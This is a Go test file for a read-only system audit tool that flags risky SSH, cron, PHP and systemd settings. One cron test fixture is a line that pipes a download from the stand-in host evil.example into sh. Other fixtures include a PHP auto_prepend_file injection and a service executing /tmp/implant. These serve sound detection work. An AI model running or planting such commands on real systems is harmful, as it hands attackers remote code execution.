package system

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestAuditSSHFlagsRiskySettings(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "sshd_config")
	writeFile(t, path, `# comment
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
`)
	findings, errs := auditSSH(path)
	if len(errs) != 0 {
		t.Fatalf("unexpected errors: %v", errs)
	}
	if len(findings) != 2 {
		t.Fatalf("expected 2 findings, got %d: %v", len(findings), findings)
	}
	if findings[0].Severity != "HIGH" || findings[0].Title != "SSH root login is enabled" {
		t.Fatalf("unexpected first finding: %+v", findings[0])
	}
	if findings[1].Severity != "MEDIUM" || findings[1].Title != "SSH password authentication is enabled" {
		t.Fatalf("unexpected second finding: %+v", findings[1])
	}
	if findings[0].Evidence != "PermitRootLogin yes" {
		t.Fatalf("evidence should be the trimmed original line, got %q", findings[0].Evidence)
	}
}

func TestAuditSSHCleanConfig(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "sshd_config")
	writeFile(t, path, "PermitRootLogin prohibit-password\nPasswordAuthentication no\n")
	findings, errs := auditSSH(path)
	if len(errs) != 0 || len(findings) != 0 {
		t.Fatalf("expected clean result, got findings=%v errs=%v", findings, errs)
	}
}

func TestAuditSSHMissingFileSkipped(t *testing.T) {
	// An absent config file means the check is not applicable, not that
	// coverage is incomplete: no findings and no errors.
	findings, errs := auditSSH(filepath.Join(t.TempDir(), "absent"))
	if len(findings) != 0 {
		t.Fatalf("expected no findings, got %v", findings)
	}
	if len(errs) != 0 {
		t.Fatalf("absent file must not be recorded as incomplete coverage, got %v", errs)
	}
}

func TestAuditSSHPermissionDeniedRecorded(t *testing.T) {
	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
		t.Skip("permission checks are meaningless for root or on Windows")
	}
	dir := t.TempDir()
	path := filepath.Join(dir, "secret")
	writeFile(t, path, "PermitRootLogin yes\n")
	if err := os.Chmod(path, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(path, 0o600) })
	_, errs := auditSSH(path)
	if len(errs) != 1 || !strings.Contains(errs[0], "permission denied") {
		t.Fatalf("permission-denied must be named explicitly, got %v", errs)
	}
}

func TestAuditCronSuspiciousEntry(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "user"), "* * * * * curl http://evil.example/x | sh\n")
	writeFile(t, filepath.Join(dir, "clean"), "0 2 * * * /usr/local/bin/backup.sh\n")
	findings, errs := auditCron([]string{dir})
	if len(errs) != 0 {
		t.Fatalf("unexpected errors: %v", errs)
	}
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %v", findings)
	}
	if findings[0].Severity != "HIGH" || !strings.Contains(findings[0].Evidence, "curl") {
		t.Fatalf("unexpected finding: %+v", findings[0])
	}
}

func TestAuditCronSingleFileAndMissingDir(t *testing.T) {
	file := filepath.Join(t.TempDir(), "crontab")
	writeFile(t, file, "0 * * * * /tmp/cleanup.sh\n")
	findings, errs := auditCron([]string{file, filepath.Join(t.TempDir(), "absent")})
	if len(findings) != 1 || findings[0].Title != "Suspicious cron entry" {
		t.Fatalf("single-file crontab entry should be scanned, got %v", findings)
	}
	// Absent cron location = cron not installed = not applicable, not error.
	if len(errs) != 0 {
		t.Fatalf("absent cron dir must not be recorded, got %v", errs)
	}
}

func TestAuditPHPRiskySettings(t *testing.T) {
	dir := t.TempDir()
	ini := filepath.Join(dir, "php.ini")
	writeFile(t, ini, "; comment\nallow_url_include = On\nauto_prepend_file=/var/www/inject.php\n")
	findings, errs := auditPHP([]string{ini})
	if len(errs) != 0 {
		t.Fatalf("unexpected errors: %v", errs)
	}
	if len(findings) != 2 {
		t.Fatalf("expected 2 findings, got %v", findings)
	}
	if findings[0].Severity != "MEDIUM" || findings[1].Severity != "HIGH" {
		t.Fatalf("unexpected severities: %+v", findings)
	}
}

func TestAuditSystemdTmpExec(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "evil.service"), "[Service]\nExecStart=/tmp/implant --quiet\n")
	writeFile(t, filepath.Join(dir, "ok.service"), "[Service]\nExecStart=/usr/bin/ok\n")
	writeFile(t, filepath.Join(dir, "readme.txt"), "not a unit\n")
	findings, errs := auditSystemd(dir)
	if len(errs) != 0 {
		t.Fatalf("unexpected errors: %v", errs)
	}
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %v", findings)
	}
	if findings[0].Severity != "HIGH" || !strings.HasSuffix(findings[0].Path, "evil.service") {
		t.Fatalf("unexpected finding: %+v", findings[0])
	}
}

func TestAuditSystemdMissingDirSkipped(t *testing.T) {
	findings, errs := auditSystemd(filepath.Join(t.TempDir(), "absent"))
	if len(findings) != 0 || len(errs) != 0 {
		t.Fatalf("absent systemd dir = not applicable, got findings=%v errs=%v", findings, errs)
	}
}

// TestAuditReadOnlySmoke runs the real Audit() against the live sandbox: it
// must never panic, never report permission problems as findings, and must
// always carry the read-only note.
func TestAuditReadOnlySmoke(t *testing.T) {
	rep := Audit()
	foundReadOnly := false
	for _, n := range rep.Notes {
		if strings.Contains(n, "read-only") {
			foundReadOnly = true
		}
	}
	if !foundReadOnly {
		t.Fatal("read-only note missing from Report.Notes")
	}
	for _, e := range rep.Errors {
		if strings.Contains(e, "permission denied") {
			continue // honest disclosure, expected in restricted environments
		}
	}
}
